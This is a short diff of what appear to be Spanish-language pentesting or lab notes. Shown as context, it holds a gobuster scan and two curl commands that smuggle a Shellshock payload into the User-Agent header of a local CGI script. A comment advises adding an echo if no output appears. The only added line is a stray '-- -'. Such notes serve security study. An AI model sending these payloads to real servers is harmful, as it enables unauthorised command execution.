@@ -18,3 +18,4 @@ gobuster dir -u http://localhost/ -w /usr/share/seclists/Discovery/Web-Content/d
 curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /usr/bin/whoami"
 curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; echo; /usr/bin/whoami" ---> Si no reporta nada el comando anterior le metemos un echo antes
 ```
+-- - 
